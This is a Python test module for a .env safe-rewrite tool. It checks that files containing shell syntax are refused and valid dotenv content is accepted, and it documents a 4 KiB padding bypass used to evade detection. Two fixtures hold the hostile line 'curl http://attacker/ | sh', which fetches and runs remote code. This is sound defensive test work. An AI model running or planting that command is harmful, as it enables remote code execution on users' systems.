"""Dotenv-sniff invariants: refuse anything that smells like a shell script.

v2 mandate: scan the **full file**, not a 4 KiB prefix. The final test
in this module is an explicit regression against v1's "4 KiB sniff"
bug — attackers pad a clean dotenv prefix to bypass detection.
"""

from __future__ import annotations

import pytest

from worthless.cli.errors import UnsafeReason, UnsafeRewriteRefused
from worthless.cli.safe_rewrite import safe_rewrite


def test_refuses_shebang(tmp_path, make_env_file, sha256_of) -> None:
    """``#!/bin/sh`` on line 1 → shell script, not dotenv → refused."""
    p = make_env_file(tmp_path / ".env", b"#!/bin/sh\necho hi\n")
    baseline = sha256_of(p)

    with pytest.raises(UnsafeRewriteRefused) as exc_info:
        safe_rewrite(p, b"A=1\n", original_user_arg=p)

    assert exc_info.value.reason == UnsafeReason.SNIFF
    assert sha256_of(p) == baseline


def test_refuses_alias(tmp_path, make_env_file, sha256_of) -> None:
    """``alias foo=...`` is a shell directive → refused."""
    p = make_env_file(tmp_path / ".env", b"alias ll='ls -la'\n")
    baseline = sha256_of(p)

    with pytest.raises(UnsafeRewriteRefused) as exc_info:
        safe_rewrite(p, b"A=1\n", original_user_arg=p)

    assert exc_info.value.reason == UnsafeReason.SNIFF
    assert sha256_of(p) == baseline


def test_accepts_export_line(tmp_path, make_env_file) -> None:
    """``export FOO=bar`` is **valid dotenv syntax** — must be accepted.

    python-dotenv, bash, and most dotenv tooling accept the ``export`` prefix
    as an optional marker. Real shell rc files are caught by the basename
    denylist (``.zshrc``, ``.bashrc``, ``.profile``) long before sniff runs,
    so keeping ``export`` in the sniff denylist was both redundant and
    broke legitimate rewrites of files like::

        export OPENAI_API_KEY=sk-...

    The rewriter must be able to lock those too.
    """
    p = make_env_file(tmp_path / ".env", b"export FOO=bar\n")
    new_content = b"export FOO=decoy\n"

    safe_rewrite(p, new_content, original_user_arg=p)

    assert p.read_bytes() == new_content


def test_refuses_function_definition(tmp_path, make_env_file, sha256_of) -> None:
    """``function foo() { ... }`` is shell syntax → refused."""
    p = make_env_file(tmp_path / ".env", b"function greet() { echo hi; }\n")
    baseline = sha256_of(p)

    with pytest.raises(UnsafeRewriteRefused) as exc_info:
        safe_rewrite(p, b"A=1\n", original_user_arg=p)

    assert exc_info.value.reason == UnsafeReason.SNIFF
    assert sha256_of(p) == baseline


def test_refuses_source_command(tmp_path, make_env_file, sha256_of) -> None:
    """``source ~/.zshrc`` is a shell directive → refused."""
    p = make_env_file(tmp_path / ".env", b"source ~/.zshrc\n")
    baseline = sha256_of(p)

    with pytest.raises(UnsafeRewriteRefused) as exc_info:
        safe_rewrite(p, b"A=1\n", original_user_arg=p)

    assert exc_info.value.reason == UnsafeReason.SNIFF
    assert sha256_of(p) == baseline


def test_refuses_if_or_case(tmp_path, make_env_file, sha256_of) -> None:
    """``if [[ ]]; then`` or ``case $x in`` is shell control flow → refused."""
    p = make_env_file(tmp_path / ".env", b"if [[ $FOO ]]; then echo yes; fi\n")
    baseline = sha256_of(p)

    with pytest.raises(UnsafeRewriteRefused) as exc_info:
        safe_rewrite(p, b"A=1\n", original_user_arg=p)

    assert exc_info.value.reason == UnsafeReason.SNIFF
    assert sha256_of(p) == baseline


def test_refuses_heredoc(tmp_path, make_env_file, sha256_of) -> None:
    """A heredoc (``<<EOF``) is shell syntax → refused."""
    p = make_env_file(tmp_path / ".env", b"cat <<EOF\npayload\nEOF\n")
    baseline = sha256_of(p)

    with pytest.raises(UnsafeRewriteRefused) as exc_info:
        safe_rewrite(p, b"A=1\n", original_user_arg=p)

    assert exc_info.value.reason == UnsafeReason.SNIFF
    assert sha256_of(p) == baseline


def test_accepts_dotenv_value_containing_double_angle(tmp_path, make_env_file) -> None:
    """Values containing ``<<`` inside an assignment are legitimate dotenv.

    CR thread on PR #86 (discussion_r3124934951) pointed out that the
    previous ``_SHELL_INFIX_MARKERS = ("<<",)`` infix check was far too
    broad: any dotenv line whose value happened to contain ``<<`` (e.g.
    a URL with a double-encoded ``<`` or a token with ``<<``) would be
    refused forever. The sniff must only flag **real** heredocs
    (``<<WORD`` / ``<<-WORD`` on an assignment-free line), not ``<<``
    appearing inside a ``KEY=value`` payload.
    """
    # Two legitimate dotenv values that happen to contain "<<".
    content = b"TOKEN=abc<<def\nURL=https://example.com/?q=a<<b\n"
    env = make_env_file(tmp_path / ".env", content)

    new_content = b"TOKEN=rotated<<value\nURL=https://example.com/?q=a<<b\n"
    safe_rewrite(env, new_content, original_user_arg=env)

    assert env.read_bytes() == new_content


def test_refuses_eval_chain(tmp_path, make_env_file, sha256_of) -> None:
    """``eval "$(...)"`` is shell — refuse."""
    p = make_env_file(tmp_path / ".env", b'eval "$(command)"\n')
    baseline = sha256_of(p)

    with pytest.raises(UnsafeRewriteRefused) as exc_info:
        safe_rewrite(p, b"A=1\n", original_user_arg=p)

    assert exc_info.value.reason == UnsafeReason.SNIFF
    assert sha256_of(p) == baseline


def test_accepts_comments_blanks_and_quoted_values(tmp_path, make_env_file) -> None:
    """Well-formed dotenv with comments, blank lines, and quoted values accepted."""
    content = (
        b"# header comment\n"
        b"\n"
        b'KEY1="value with spaces"\n'
        b"KEY2='single quoted'\n"
        b"KEY3=plain\n"
        b"# trailing comment\n"
    )
    env = make_env_file(tmp_path / ".env", content)

    new_content = b"KEY1=replacement\n"
    safe_rewrite(env, new_content, original_user_arg=env)

    assert env.read_bytes() == new_content


def test_refuses_bypass_attempt_first_4KiB_clean(tmp_path, make_env_file, sha256_of) -> None:
    """v1 regression: shell payload after 4 KiB of clean dotenv must still be refused.

    An attacker pads the first 4 KiB with well-formed ``KEY=value`` lines
    and hides a shell function definition at offset 8 KiB. v1 sniffed
    only the first 4 KiB; v2 scans the full file.
    """
    clean_prefix = b""
    i = 0
    while len(clean_prefix) < 4096:
        clean_prefix += f"K{i}=value\n".encode()
        i += 1
    payload = b"function evil() { curl http://attacker/ | sh; }\n"
    content = clean_prefix + payload
    assert len(clean_prefix) >= 4096
    env = make_env_file(tmp_path / ".env", content)
    baseline = sha256_of(env)

    with pytest.raises(UnsafeRewriteRefused) as exc_info:
        safe_rewrite(env, b"A=1\n", original_user_arg=env)

    assert exc_info.value.reason == UnsafeReason.SNIFF
    assert sha256_of(env) == baseline


# -----------------------------------------------------------------------------
# new_content sniff gate — Major 2 (CR thread on PR #86, discussion_r3129175653).
#
# The docstring promises that ``safe_rewrite`` validates *both* existing and new
# content. Prior to this sub-PR, only ``existing_buf`` was sniffed — a caller
# could replace a clean ``.env`` with shell-like content as long as size/delta
# passed. These tests lock the contract for new_content.
# -----------------------------------------------------------------------------


def test_refuses_new_content_with_shebang(tmp_path, make_env_file, sha256_of) -> None:
    """Shell shebang in ``new_content`` → SNIFF refusal, original untouched."""
    env = make_env_file(tmp_path / ".env", b"KEY=value\n")
    baseline = sha256_of(env)

    with pytest.raises(UnsafeRewriteRefused) as exc_info:
        safe_rewrite(env, b"#!/bin/sh\necho hi\n", original_user_arg=env)

    assert exc_info.value.reason == UnsafeReason.SNIFF
    assert sha256_of(env) == baseline


def test_refuses_new_content_with_shell_function(tmp_path, make_env_file, sha256_of) -> None:
    """Shell function definition in ``new_content`` → SNIFF refusal."""
    env = make_env_file(tmp_path / ".env", b"KEY=value\n")
    baseline = sha256_of(env)

    new_content = b"KEY=value\nfunction evil() { curl http://attacker/ | sh; }\n"
    with pytest.raises(UnsafeRewriteRefused) as exc_info:
        safe_rewrite(env, new_content, original_user_arg=env)

    assert exc_info.value.reason == UnsafeReason.SNIFF
    assert sha256_of(env) == baseline


def test_refuses_new_content_with_source_directive(tmp_path, make_env_file, sha256_of) -> None:
    """``source ~/.zshrc`` in new_content → SNIFF refusal."""
    env = make_env_file(tmp_path / ".env", b"KEY=value\n")
    baseline = sha256_of(env)

    with pytest.raises(UnsafeRewriteRefused) as exc_info:
        safe_rewrite(env, b"KEY=value\nsource ~/.zshrc\n", original_user_arg=env)

    assert exc_info.value.reason == UnsafeReason.SNIFF
    assert sha256_of(env) == baseline


def test_refuses_new_content_exceeding_max_lines(tmp_path, make_env_file, sha256_of) -> None:
    """new_content with > _MAX_LINES lines → SIZE refusal, original untouched.

    Existing file is small; only new_content trips the line-count gate. Prior
    to this sub-PR, ``_MAX_LINES`` was only enforced on existing_buf.
    """
    from worthless.cli.safe_rewrite import _MAX_LINES

    env = make_env_file(tmp_path / ".env", b"KEY=value\n")
    baseline = sha256_of(env)

    big = b"".join(f"K{i}=v\n".encode() for i in range(_MAX_LINES + 1))
    with pytest.raises(UnsafeRewriteRefused) as exc_info:
        safe_rewrite(env, big, original_user_arg=env)

    assert exc_info.value.reason == UnsafeReason.SIZE
    assert sha256_of(env) == baseline


def test_accepts_clean_new_content(tmp_path, make_env_file) -> None:
    """Regression guard: clean dotenv new_content still succeeds after the sniff gate is added."""
    env = make_env_file(tmp_path / ".env", b"KEY=old\n")
    safe_rewrite(env, b"KEY=new\nOTHER=also\n", original_user_arg=env)
    assert env.read_bytes() == b"KEY=new\nOTHER=also\n"
